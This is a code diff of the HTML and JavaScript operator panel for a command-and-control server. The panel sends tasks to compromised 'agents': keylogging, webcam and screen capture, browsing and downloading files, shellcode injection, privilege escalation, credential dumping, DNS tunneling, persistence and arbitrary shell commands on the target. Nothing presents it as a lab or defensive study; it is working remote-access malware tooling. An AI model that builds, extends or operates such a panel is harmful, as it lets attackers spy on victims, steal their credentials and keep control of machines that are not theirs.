@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Task Control Panel - C2 Server</title>
+    <title>C2 Control Panel</title>
     <style>
         :root {
             --bg: #f4f4f4;
@@ -14,7 +14,6 @@
             --success: #28a745;
             --danger: #dc3545;
             --warning: #ffc107;
-            --info: #17a2b8;
         }
 
         [data-theme="dark"] {
@@ -37,17 +36,12 @@
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            text-align: center;
-        }
-
-        h1, h2 {
-            color: var(--text);
-            text-align: center;
-            margin-bottom: 30px;
         }
 
         h1 {
-            font-size: 2.5em;
+            text-align: center;
+            color: var(--text);
+            margin-bottom: 30px;
         }
 
         nav {
@@ -60,118 +54,45 @@
             text-decoration: none;
             color: var(--primary);
             font-weight: 500;
-            font-size: 1.1em;
-            transition: color 0.3s;
         }
 
-        nav a:hover {
-            color: var(--text);
+        .module-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
         }
 
-        .card {
+        .module-card {
             background-color: var(--card);
-            padding: 30px;
-            margin: 30px auto;
+            padding: 20px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            max-width: 900px;
-            text-align: left;
         }
 
-        .form-group {
+        .module-card h3 {
+            margin-top: 0;
+            color: var(--primary);
+        }
+
+        .module-card p {
             margin-bottom: 15px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 500;
-        }
-
-        input[type="text"],
-        select,
-        textarea {
-            width: 100%;
-            padding: 8px;
-            border: 1px solid var(--border);
-            border-radius: 4px;
-            background-color: var(--card);
+            font-size: 0.9em;
             color: var(--text);
-            margin-top: 5px;
-        }
-
-        textarea {
-            min-height: 100px;
-            resize: vertical;
         }
 
         button {
             background-color: var(--primary);
             color: white;
             border: none;
-            padding: 10px 20px;
+            padding: 8px 16px;
             border-radius: 4px;
             cursor: pointer;
-            font-size: 14px;
-            transition: background-color 0.3s;
+            width: 100%;
         }
 
         button:hover {
             opacity: 0.9;
-        }
-
-        button:disabled {
-            background-color: var(--border);
-            cursor: not-allowed;
-        }
-
-        .task-history {
-            margin-top: 20px;
-        }
-
-        .task-item {
-            padding: 20px;
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            margin-bottom: 15px;
-            background-color: var(--card);
-            transition: transform 0.2s;
-        }
-
-        .task-item:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-        }
-
-        .task-item .status {
-            display: inline-block;
-            padding: 3px 8px;
-            border-radius: 3px;
-            font-size: 12px;
-            margin-left: 10px;
-        }
-
-        .status.pending {
-            background-color: var(--warning);
-            color: #000;
-        }
-
-        .status.completed {
-            background-color: var(--success);
-            color: #fff;
-        }
-
-        .status.failed {
-            background-color: var(--danger);
-            color: #fff;
-        }
-
-        .task-result {
-            background-color: var(--card);
-            padding: 10px;
-            margin-top: 10px;
-            border-left: 5px solid var(--primary);
-            white-space: pre-wrap;
         }
 
         .toggle-theme {
@@ -184,45 +105,34 @@
             padding: 8px 15px;
             border-radius: 4px;
             cursor: pointer;
+            width: auto;
         }
 
-        .predefined-tasks {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-
-        .task-button {
-            background-color: var(--card);
-            border: 1px solid var(--border);
-            color: var(--text);
+        #taskStatus {
+            margin-top: 20px;
             padding: 15px;
-            border-radius: 8px;
-            cursor: pointer;
-            text-align: left;
-            transition: all 0.3s;
+            border-radius: 4px;
+            display: none;
         }
 
-        .task-button:hover {
-            border-color: var(--primary);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        .success {
+            background-color: var(--success);
+            color: white;
         }
 
-        .task-button.selected {
-            border-color: var(--primary);
-            background-color: rgba(0, 123, 255, 0.1);
+        .error {
+            background-color: var(--danger);
+            color: white;
         }
 
-        .task-button small {
-            display: block;
-            margin-top: 5px;
-            opacity: 0.8;
-        }
-
-        #taskHistory {
-            text-align: left;
+        .agent-select {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            background-color: var(--bg);
+            color: var(--text);
         }
     </style>
 </head>
@@ -235,119 +145,95 @@
             <a href="/">Dashboard</a>
             <a href="/shellcode">Shellcode Generator</a>
             <a href="/control">Task Control Panel</a>
+            <a href="/modules">Module Manager</a>
         </nav>
 
-        <div class="card">
-            <h2>Send Task to Agent</h2>
-            
-            <div id="statusMessage" style="display: none; margin-bottom: 20px; padding: 10px; border-radius: 4px;">
-            </div>
-            
-            <div class="predefined-tasks">
-                <!-- System Information -->
-                <button class="task-button" onclick="selectTask('system_info')">
-                    💻 System Info
-                    <small>Get detailed system information</small>
-                </button>
+        <select id="agentSelect" class="agent-select">
+            <option value="">Select an agent...</option>
+        </select>
 
-                <!-- Process Management -->
-                <button class="task-button" onclick="selectTask('process_list')">
-                    📋 Process List
-                    <small>List running processes</small>
-                </button>
-                <button class="task-button" onclick="selectTask('process_injection')">
-                    💉 Process Injection
-                    <small>Inject code into running process</small>
-                </button>
-
-                <!-- Surveillance -->
-                <button class="task-button" onclick="selectTask('keylogger')">
-                    ⌨️ Keylogger
-                    <small>Start keylogging session</small>
-                </button>
-                <button class="task-button" onclick="selectTask('screenshot')">
-                    📸 Screenshot
-                    <small>Capture screen</small>
-                </button>
-                <button class="task-button" onclick="selectTask('webcam')">
-                    📹 Webcam
-                    <small>Capture webcam image</small>
-                </button>
-
-                <!-- File Operations -->
-                <button class="task-button" onclick="selectTask('file_exfil')">
-                    📂 File Exfiltration
-                    <small>Retrieve specific files</small>
-                </button>
-
-                <!-- Privilege Escalation -->
-                <button class="task-button" onclick="selectTask('priv_esc')">
-                    🔑 Privilege Escalation
-                    <small>Attempt privilege escalation</small>
-                </button>
-
-                <!-- Persistence -->
-                <button class="task-button" onclick="selectTask('persistence')">
-                    🔄 Persistence
-                    <small>Establish persistence</small>
-                </button>
-
-                <!-- Credential Access -->
-                <button class="task-button" onclick="selectTask('credential_dump')">
-                    🔐 Credential Dump
-                    <small>Extract stored credentials</small>
-                </button>
-
-                <!-- Network -->
-                <button class="task-button" onclick="selectTask('dns_tunnel')">
-                    🌐 DNS Tunnel
-                    <small>Setup DNS tunneling</small>
-                </button>
-
-                <!-- Evasion -->
-                <button class="task-button" onclick="selectTask('evasion')">
-                    🕵️ Evasion
-                    <small>Execute evasion techniques</small>
-                </button>
-
-                <!-- Post Exploitation -->
-                <button class="task-button" onclick="selectTask('post_exploit')">
-                    🎯 Post Exploit
-                    <small>Run post-exploitation tasks</small>
-                </button>
-
-                <!-- Custom Commands -->
-                <button class="task-button" onclick="selectTask('custom')">
-                    🔧 Custom Command
-                    <small>Execute custom command</small>
-                </button>
+        <div class="module-grid">
+            <!-- Core Modules -->
+            <div class="module-card">
+                <h3>System Information</h3>
+                <p>Get detailed system information from the target.</p>
+                <button onclick="sendTask('modules.system.get_info')">Get System Info</button>
             </div>
 
-            <form id="taskForm" onsubmit="sendTask(event)">
-                <div class="form-group">
-                    <label for="agent_id">Agent ID:</label>
-                    <input type="text" id="agent_id" name="agent_id" required>
-                </div>
-                <div class="form-group">
-                    <label for="task">Task Type:</label>
-                    <input type="text" id="task" name="task" required>
-                </div>
-                <div class="form-group" id="customParamsGroup" style="display: none;">
-                    <label for="task_params">Task Parameters (JSON):</label>
-                    <textarea id="task_params" name="task_params" placeholder="{ &quot;param1&quot;: &quot;value1&quot; }"></textarea>
-                </div>
-                <button type="submit" id="sendTaskBtn">Send Task</button>
-            </form>
+            <div class="module-card">
+                <h3>Process Management</h3>
+                <p>List and manage processes on the target system.</p>
+                <button onclick="sendTask('modules.process.list')">List Processes</button>
+            </div>
+
+            <!-- Surveillance Modules -->
+            <div class="module-card">
+                <h3>Screenshot</h3>
+                <p>Capture screen of the target system.</p>
+                <button onclick="sendTask('modules.surveillance.screenshot')">Take Screenshot</button>
+            </div>
+
+            <div class="module-card">
+                <h3>Webcam</h3>
+                <p>Capture image from webcam if available.</p>
+                <button onclick="sendTask('modules.surveillance.webcam')">Capture Webcam</button>
+            </div>
+
+            <div class="module-card">
+                <h3>Keylogger</h3>
+                <p>Start/Stop keylogging on the target.</p>
+                <button onclick="sendTask('modules.surveillance.keylogger')">Toggle Keylogger</button>
+            </div>
+
+            <!-- File Operations -->
+            <div class="module-card">
+                <h3>File Browser</h3>
+                <p>Browse and download files from the target.</p>
+                <button onclick="sendTask('modules.files.browser')">Browse Files</button>
+            </div>
+
+            <!-- Advanced Modules -->
+            <div class="module-card">
+                <h3>Shellcode Injection</h3>
+                <p>Inject shellcode into target process.</p>
+                <button onclick="sendTask('modules.shellcode.inject')">Inject Shellcode</button>
+            </div>
+
+            <div class="module-card">
+                <h3>Privilege Escalation</h3>
+                <p>Attempt to elevate privileges.</p>
+                <button onclick="sendTask('modules.privesc.auto')">Escalate Privileges</button>
+            </div>
+
+            <div class="module-card">
+                <h3>Credential Access</h3>
+                <p>Attempt to dump stored credentials.</p>
+                <button onclick="sendTask('modules.credentials.dump')">Dump Credentials</button>
+            </div>
+
+            <div class="module-card">
+                <h3>DNS Tunneling</h3>
+                <p>Establish DNS tunneling channel.</p>
+                <button onclick="sendTask('modules.dns_tunnel.start')">Toggle DNS Tunnel</button>
+            </div>
+
+            <div class="module-card">
+                <h3>Persistence</h3>
+                <p>Install persistence mechanism.</p>
+                <button onclick="sendTask('modules.persistence.install')">Install Persistence</button>
+            </div>
+
+            <div class="module-card">
+                <h3>Custom Command</h3>
+                <p>Execute custom command on target.</p>
+                <button onclick="sendCustomCommand()">Execute Command</button>
+            </div>
         </div>
 
-        <div class="card">
-            <h2>Task History</h2>
-            <div id="taskHistory"></div>
-        </div>
+        <div id="taskStatus"></div>
     </div>
 
     <script>
-        // Theme management
         function toggleTheme() {
             const current = localStorage.getItem('theme') || 'light';
             const next = current === 'light' ? 'dark' : 'light';
@@ -358,114 +244,111 @@
         // Initialize theme
         document.body.setAttribute('data-theme', localStorage.getItem('theme') || 'light');
 
-        function selectTask(taskType) {
-            document.getElementById('task').value = taskType;
-            
-            // Update UI to show selected task
-            document.querySelectorAll('.task-button').forEach(btn => {
-                btn.classList.remove('selected');
-            });
-            event.target.closest('.task-button').classList.add('selected');
-            
-            const taskInput = document.getElementById('task_type');
-            const paramsGroup = document.getElementById('customParamsGroup');
-            
-            taskInput.value = taskType;
-            
-            // Show/hide params based on task type
-            if (taskType === 'custom' || taskType === 'file_exfil') {
-                paramsGroup.style.display = 'block';
-                if (taskType === 'file_exfil') {
-                    document.getElementById('task_params').placeholder = '{ "path": "/path/to/file" }';
-                } else {
-                    document.getElementById('task_params').placeholder = '{ "command": "your_command_here" }';
+        async function updateAgentList() {
+            try {
+                const response = await fetch('/api/agents');
+                const agents = await response.json();
+                const select = document.getElementById('agentSelect');
+                
+                // Clear existing options except the first one
+                while (select.options.length > 1) {
+                    select.remove(1);
                 }
-            } else {
-                paramsGroup.style.display = 'none';
+                
+                // Add new options
+                agents.forEach(agent => {
+                    const option = document.createElement('option');
+                    option.value = agent.agent_id;
+                    option.textContent = `${agent.agent_id} (${agent.hostname || 'Unknown'}) - ${agent.status}`;
+                    select.appendChild(option);
+                });
+            } catch (error) {
+                console.error('Error updating agent list:', error);
+                showStatus('Failed to update agent list', 'error');
+            }
+        }
+
+        async function sendTask(taskType) {
+            const agentId = document.getElementById('agentSelect').value;
+            if (!agentId) {
+                showStatus('Please select an agent first', 'error');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/tasks', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        agent_id: agentId,
+                        module: taskType,
+                        params: {}
+                    })
+                });
+
+                const result = await response.json();
+                if (result.status === 'success') {
+                    showStatus(`Task ${taskType} sent successfully. Task ID: ${result.task_id}`, 'success');
+                } else {
+                    showStatus(`Error: ${result.message}`, 'error');
+                }
+            } catch (error) {
+                showStatus(`Error sending task: ${error.message}`, 'error');
+            }
+        }
+
+        async function sendCustomCommand() {
+            const command = prompt('Enter command to execute:');
+            if (command) {
+                const agentId = document.getElementById('agentSelect').value;
+                if (!agentId) {
+                    showStatus('Please select an agent first', 'error');
+                    return;
+                }
+
+                try {
+                    const response = await fetch('/api/tasks', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            agent_id: agentId,
+                            module: 'modules.shell.execute',
+                            params: {
+                                command: command
+                            }
+                        })
+                    });
+
+                    const result = await response.json();
+                    if (result.status === 'success') {
+                        showStatus(`Custom command sent successfully. Task ID: ${result.task_id}`, 'success');
+                    } else {
+                        showStatus(`Error: ${result.message}`, 'error');
+                    }
+                } catch (error) {
+                    showStatus(`Error sending command: ${error.message}`, 'error');
+                }
             }
         }
 
         function showStatus(message, type) {
-            const statusDiv = document.getElementById('statusMessage');
-            statusDiv.style.display = 'block';
-            statusDiv.style.backgroundColor = type === 'error' ? 'var(--danger)' : 'var(--success)';
-            statusDiv.style.color = '#fff';
+            const statusDiv = document.getElementById('taskStatus');
             statusDiv.textContent = message;
+            statusDiv.className = type;
+            statusDiv.style.display = 'block';
             
-            // Auto-hide after 5 seconds
             setTimeout(() => {
                 statusDiv.style.display = 'none';
             }, 5000);
         }
 
-        async function sendTask(event) {
-            event.preventDefault();
-            const form = event.target;
-            const submitBtn = form.querySelector('button[type="submit"]');
-            submitBtn.disabled = true;
-
-            try {
-                const formData = new FormData(form);
-                const response = await fetch('/send_task', {
-                    method: 'POST',
-                    body: formData
-                });
-
-                const result = await response.json();
-                
-                if (result.status === 'sent') {
-                    showStatus(`Task sent successfully! Task ID: ${result.task_id}`, 'success');
-                    form.reset();
-                    document.querySelectorAll('.task-button').forEach(btn => {
-                        btn.classList.remove('selected');
-                    });
-                    await updateTaskHistory();
-                } else {
-                    showStatus(`Error: ${result.message}`, 'error');
-                }
-            } catch (error) {
-                showStatus(`Error: ${error.message}`, 'error');
-            } finally {
-                submitBtn.disabled = false;
-            }
-        }
-
-        async function updateTaskHistory() {
-            const historyDiv = document.getElementById('taskHistory');
-            try {
-                const agentId = document.getElementById('agent_id').value;
-                if (!agentId) return;
-
-                const response = await fetch(`/api/tasks/${agentId}`);
-                const tasks = await response.json();
-
-                historyDiv.innerHTML = tasks.length ? '' : '<p>No tasks found for this agent.</p>';
-                
-                tasks.reverse().forEach(task => {
-                    const taskDiv = document.createElement('div');
-                    taskDiv.className = 'task-item';
-                    taskDiv.innerHTML = `
-                        <strong>Task ID:</strong> ${task.id}
-                        <span class="status ${task.status}">${task.status}</span><br>
-                        <strong>Type:</strong> ${task.type}<br>
-                        <strong>Time:</strong> ${new Date(task.timestamp).toLocaleString()}<br>
-                        ${task.result ? `<div class="task-result">${task.result}</div>` : ''}
-                    `;
-                    historyDiv.appendChild(taskDiv);
-                });
-            } catch (error) {
-                console.error('Error fetching task history:', error);
-            }
-        }
-
-        // Update task history when agent ID changes
-        document.getElementById('agent_id').addEventListener('change', updateTaskHistory);
-        
-        // Initial task history update
-        updateTaskHistory();
-        
-        // Periodic updates
-        setInterval(updateTaskHistory, 5000);
+        // Update agent list every 10 seconds
+        updateAgentList();
+        setInterval(updateAgentList, 10000);
     </script>
 </body>
 </html>
